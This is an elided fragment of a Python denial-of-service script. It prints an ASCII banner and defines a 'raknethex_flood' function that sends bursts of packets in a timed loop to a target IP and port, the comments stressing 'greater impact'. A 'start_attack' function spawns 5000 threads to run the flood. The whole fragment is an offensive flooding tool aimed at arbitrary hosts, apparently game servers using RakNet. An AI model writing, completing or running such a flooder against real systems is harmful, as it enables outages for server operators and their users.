...
def print_banner():
    ...
    print(f"  #+#  #+#  #+#  #+#  #+#  #+# {RESET}")
    print(f"   ###  ###  ########  ###  ###  {RESET}")
    print(f"\n{BRANCO}ES HORA DEL SHOW! EN BRASILÑO{RESET}")
...
def raknethex_flood(ip, port, tempo, metodo):
    ...
    while time.time() < end:
        try:
            for _ in range(100):  # Enviar mais pacotes por iteração para maior impacto
...
def start_attack(ip, port, tempo, username, metodo="raknethex", threads=5000):
    ...
    for _ in range(threads):
        threading.Thread(target=raknethex_flood, args=(ip, port, tempo, metodo), daemon=True).start()
